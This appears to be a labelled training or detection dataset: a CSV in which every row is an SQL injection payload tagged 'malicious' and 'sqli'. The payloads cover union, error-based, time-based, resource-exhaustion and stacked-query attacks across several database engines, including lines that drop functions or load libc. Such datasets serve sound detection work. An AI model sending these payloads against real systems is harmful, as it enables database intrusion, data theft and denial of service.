payload,label,attack_type
"-1585%"")) union all select 8818,8818,8818,8818,8818,8818#",malicious,sqli
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",malicious,sqli
-3083) or 5221=7829,malicious,sqli
1))) and (select * from (select(sleep(5)))fzno) and (((1601=1601,malicious,sqli
"1"" where 9901=9901 and (2455=8499)*8499--",malicious,sqli
"1"" where 2462=2462 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('hgtg'='hgtg,malicious,sqli
"1%') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('%'='",malicious,sqli
"-3326'+(select xitp where 7621=7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",malicious,sqli
"-5275%')) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",malicious,sqli
"1) union all select null,null,null,null,null#",malicious,sqli
-7710' where 5658=5658 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
"1%""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""%""=""",malicious,sqli
"1"")) as xxdm where 4818=4818;begin dbms_lock.sleep(5); end--",malicious,sqli
"-9145%'))) or make_set(9017=9368,9368) and ((('%'='",malicious,sqli
"1'||(select 'lpej' from dual where 8294=8294 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",malicious,sqli
"-9884') or elt(1942=8409,8409) and ('tqdq' like 'tqdq",malicious,sqli
-8615))) or 4039=9144,malicious,sqli
1');waitfor delay '0:0:5' and ('eaxu'='eaxu,malicious,sqli
"1%' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1"") as tuem where 1328=1328;begin dbms_lock.sleep(5); end--",malicious,sqli
"1') where 6408=6408;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and 'uqyt'='uqyt",malicious,sqli
"1,(select (case when (1255=8025) then 1 else 1255*(select 1255 from mysql.db) end))",malicious,sqli
"1%""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""",malicious,sqli
"1) as czeu where 1738=1738 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",malicious,sqli
"1 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))# jpau",malicious,sqli
1'))) and (5995=9618)*9618 and ((('nagr' like 'nagr,malicious,sqli
"1') or elt(6272=6272,sleep(5)) and ('tmbs'='tmbs",malicious,sqli
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'dubu' like 'dubu",malicious,sqli
"-2032%""))) or (3082=7155)*7155 and (((""%""=""",malicious,sqli
"1') as wnyl where 8978=8978 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""rfam"" like ""rfam",malicious,sqli
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,malicious,sqli
1%'));if(8182=3225) select 8182 else drop function kpzk--,malicious,sqli
"1 where 5266=5266 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",malicious,sqli
1'||(select 'mnvk' from dual where 4181=4181;select (case when (3676=8635) then 3676 else 1/(select 0) end)--,malicious,sqli
"1"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"-1166')) as icdz where 1042=1042 union all select 1042,1042,1042,1042,1042#",malicious,sqli
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",malicious,sqli
1') where 4277=4277 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,malicious,sqli
"-1647')) union all select 3030,3030,3030,3030,3030,3030,3030--",malicious,sqli
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""deeu"" like ""deeu",malicious,sqli
"1%""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",malicious,sqli
"1'||(select 'bgdh' from dual where 1967=1967;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"1"") as rgod where 5766=5766 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
1) as rlft where 1670=1670 waitfor delay '0:0:5'--,malicious,sqli
"1%')) union all select null,null,null,null#",malicious,sqli
"1"")) as lslk where 6729=6729 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"" where 7739=7739 and sleep(5)--",malicious,sqli
"-1434')) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",malicious,sqli
1') where 5280=5280 and 4595=4595#,malicious,sqli
"1) union all select null,null--",malicious,sqli
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",malicious,sqli
"1' and make_set(8403=8403,8899)",malicious,sqli
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('viad' like 'viad",malicious,sqli
"1"") where 7950=7950 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((4924=4924",malicious,sqli
"1',(select (case when (6750=6750) then 1 else 6750*(select 6750 from information_schema.character_sets) end))",malicious,sqli
"1"" where 9230=9230;(select * from (select(sleep(5)))srmq)--",malicious,sqli
"1) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (7244=7244",malicious,sqli
"-9601')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"-1269' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'gohv' like 'gohv",malicious,sqli
1'));select (case when (6615=3564) then 1 else 6615*(select 6615 from master..sysdatabases) end)--,malicious,sqli
"1) as biup where 1414=1414 union all select null,null,null,null,null,null,null,null#",malicious,sqli
"1"")) union all select null--",malicious,sqli
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2868=2868",malicious,sqli
1'+(select echl where 6593=6593 rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
"1%"")) union all select null,null,null--",malicious,sqli
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('toft'='toft",malicious,sqli
1'||(select 'gbyh' from dual where 5889=5889 order by 1#,malicious,sqli
-6353%')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'=',malicious,sqli
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""woun"" like ""woun",malicious,sqli
"-6155%')) union all select 2421,2421,2421,2421,2421#",malicious,sqli
"-7741') where 8271=8271 union all select 8271,8271,8271,8271,8271,8271,8271#",malicious,sqli
"1,(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",malicious,sqli
"1%' union all select null,null,null#",malicious,sqli
1 and (select * from (select(sleep(5)))fzno)-- ybmz,malicious,sqli
"1"" where 9669=9669;select sleep(5)--",malicious,sqli
"1) where 2678=2678 union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
1'+(select 'vtyw' where 7950=7950 order by 1--,malicious,sqli
"1%"")) or elt(6272=6272,sleep(5)) and ((""%""=""",malicious,sqli
"1"" and elt(1210=1210,sleep(5)) and ""phcl"" like ""phcl",malicious,sqli
"1 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1) where 7978=7978 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
"1"")) rlike (select (case when (8179=1246) then 1 else 0x28 end)) and ((""xxeu""=""xxeu",malicious,sqli
"-1874"") as wgpj where 6481=6481 or 3629=3459",malicious,sqli
"1%"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""%""=""",malicious,sqli
"1)) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((8475=8475",malicious,sqli
-4873'))) or 3038=3038,malicious,sqli
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('sqzl'='sqzl",malicious,sqli
"1'||(select 'drna' from dual where 5082=5082 and 3824=benchmark(5000000,md5(0x76555642)))||'",malicious,sqli
"1'+(select 'swxi' where 7651=7651 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",malicious,sqli
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'wjwn'='wjwn",malicious,sqli
"1%') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('%'='",malicious,sqli
"1%"");waitfor delay '0:0:5' and (""%""=""",malicious,sqli
"1%"") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1)) as rvex where 3462=3462 and 4595=4595#,malicious,sqli
1%' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',malicious,sqli
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
-2429%' or 6890=5846,malicious,sqli
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('hgwt' like 'hgwt,malicious,sqli
1')) and 4242=5831 and (('xflh' like 'xflh,malicious,sqli
"1"" rlike (select (case when (5552=1712) then 1 else 0x28 end))",malicious,sqli
"1"") as bksv where 5375=5375;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
"1)) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"" union all select null,null,null#",malicious,sqli
"1' where 7014=7014 or 8466=benchmark(5000000,md5(0x694a4745))--",malicious,sqli
1%' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and '%'=',malicious,sqli
"1') as uytv where 7875=7875 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1"")) as tmpz where 7224=7224 and make_set(3579=1045,1045)--",malicious,sqli
"1%"") and (select * from (select(sleep(5)))fzno) and (""%""=""",malicious,sqli
"-4923"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""afjc"" like ""afjc",malicious,sqli
"1' where 1673=1673 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",malicious,sqli
"1')) and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
-7562) or 8571=8571--,malicious,sqli
"1"") or (select * from (select(sleep(5)))ydpu) and (""gixv""=""gixv",malicious,sqli
"-9535"" order by 1--",malicious,sqli
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lfhx'='lfhx",malicious,sqli
"1"" and make_set(4214=9503,9503) and ""phjg"" like ""phjg",malicious,sqli
"1%""))) union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
"1'||(select 'iuud' where 3687=3687;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"1%"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1%')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1%"")));select pg_sleep(5) and (((""%""=""",malicious,sqli
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",malicious,sqli
"1"" where 1051=1051 union all select null--",malicious,sqli
"-2582'+(select ggim where 5346=5346 union all select 5346,5346#",malicious,sqli
"1'+(select nzij where 5456=5456 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",malicious,sqli
1') where 2840=2840;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1"") where 9115=9115;select case when 8867=7630 then 1 else null end--",malicious,sqli
"-4669"" or 8571=8571--",malicious,sqli
"1') where 8255=8255 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""dqou"" like ""dqou",malicious,sqli
"-8735')) union all select 3262,3262,3262--",malicious,sqli
"1%""))) or (select * from (select(sleep(5)))ydpu) and (((""%""=""",malicious,sqli
"1) where 3738=3738 or 8421=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1%"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""%""=""",malicious,sqli
"1')) union all select null,null#",malicious,sqli
"1"" where 5216=5216 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1')) union all select null#,malicious,sqli
"1') or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"-7568""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""jxge"" like ""jxge",malicious,sqli
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""quni""=""quni",malicious,sqli
"1)) as ynzg where 1926=1926 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"1%') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1')) as qqvk where 1007=1007;select * from generate_series(3379,3379,case when (3379=1219) then 1 else 0 end) limit 1--",malicious,sqli
"1 where 6412=6412 union all select null,null,null,null,null,null,null--",malicious,sqli
"1"") as dgzf where 4834=4834;select (case when (2161=4328) then 2161 else 2161*(select 2161 from mysql.db) end)#",malicious,sqli
"1%"")));(select * from (select(sleep(5)))acdk)#",malicious,sqli
1'));if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
(select (case when (6581=6581) then 1 else cast(1 as int)/(select 0 from dual) end) from dual),malicious,sqli
1')) as nsfx where 9553=9553 rlike sleep(5)--,malicious,sqli
1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),malicious,sqli
"1) as auly where 4146=4146 or elt(5873=5873,sleep(5))#",malicious,sqli
1')));waitfor delay '0:0:5' and ((('ywnm'='ywnm,malicious,sqli
"1' in boolean mode) and 8407=(select count(*) from generate_series(1,5000000))#",malicious,sqli
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('vfxg' like 'vfxg",malicious,sqli
"1 where 9752=9752;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,sqli
"1"") as ipxg where 4031=4031 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",malicious,sqli
1')));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,malicious,sqli
"1"";select (case when (8618=8706) then 8618 else 8618*(select 8618 from mysql.db) end)#",malicious,sqli
-4208%'))) or 1133=9010--,malicious,sqli
"-6129 union all select 9122,9122#",malicious,sqli
1'||(select 'scct' where 2587=2587 and (select * from (select(sleep(5)))fzno))||',malicious,sqli
"1))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1"");(select * from (select(sleep(5)))srmq) and (""vjlr"" like ""vjlr",malicious,sqli
"1%"");if(7899=7899) select 7899 else drop function zbbp--",malicious,sqli
-1087) where 5787=5787 union all select 5787#,malicious,sqli
-5352%'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'=',malicious,sqli
"1 where 6095=6095 and 8407=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1'||(select 'tmsj' where 2971=2971 union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"1'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"-3137'||(select 'btif' where 1718=1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",malicious,sqli
"-8419) where 8692=8692 union all select 8692,8692,8692--",malicious,sqli
"-4695'))) union all select 5844,5844,5844,5844,5844,5844#",malicious,sqli
1%')) and 1651=9324 and (('%'=',malicious,sqli
"-4032"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""olox""=""olox",malicious,sqli
"1"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""dwpa""=""dwpa",malicious,sqli
1)) and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"1%""))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""%""=""",malicious,sqli
1) as tbve where 4828=4828;select sleep(5)#,malicious,sqli
"1,updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",malicious,sqli
"1'||(select 'wgte' from dual where 6316=6316 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",malicious,sqli
"1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""",malicious,sqli
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,malicious,sqli
"1 where 8135=8135;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"-6170))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
1) as tykp where 6851=6851;waitfor delay '0:0:5'--,malicious,sqli
"-6851') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('csfx'='csfx",malicious,sqli
"1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",malicious,sqli
1%';if(6842=5446) select 6842 else drop function vjfq--,malicious,sqli
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",malicious,sqli
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"-1157)) as sxie where 7118=7118 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,sqli
"1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""",malicious,sqli
"1') where 1115=1115;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl",malicious,sqli
1' union all select null#,malicious,sqli
"1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-1644%' or make_set(9354=9354,7185) and '%'='",malicious,sqli
1' in boolean mode);select case when 7649=9297 then 1 else null end--,malicious,sqli
"-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms",malicious,sqli
"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
1) and sleep(5),malicious,sqli
1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,malicious,sqli
"1' where 4150=4150 and elt(8012=6026,6026)--",malicious,sqli
"1"")) as hkrh where 3060=3060 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",malicious,sqli
"-4462%"") or 8571=8571--",malicious,sqli
"-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"1%'))) union all select null,null,null,null--",malicious,sqli
"1') where 9381=9381 or elt(6272=6272,sleep(5))--",malicious,sqli
"1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",malicious,sqli
"-2862'))) union all select 6649,6649--",malicious,sqli
"-3933'))) union all select 6198,6198,6198,6198,6198#",malicious,sqli
1') as xskm where 3525=3525 and 2435=6513,malicious,sqli
1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,malicious,sqli
"1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",malicious,sqli
"make_set(7729=7729,1)",malicious,sqli
"-9337) union all select 5648,5648,5648,5648,5648#",malicious,sqli
"1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1"" and 4996=4431 and ""jzaq""=""jzaq",malicious,sqli
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv",malicious,sqli
"-9057"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"-6463""))) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",malicious,sqli
1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,malicious,sqli
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh",malicious,sqli
"1'||(select 'kbvq' where 9279=9279 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",malicious,sqli
"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1"")) as swix where 2459=2459 or 8466=benchmark(5000000,md5(0x694a4745))--",malicious,sqli
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('qgrt'='qgrt",malicious,sqli
"1"") as ucex where 5148=5148 order by 1#",malicious,sqli
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('txwf'='txwf",malicious,sqli
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""wrbs"" like ""wrbs",malicious,sqli
"1'+(select vohg where 6383=6383 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'",malicious,sqli
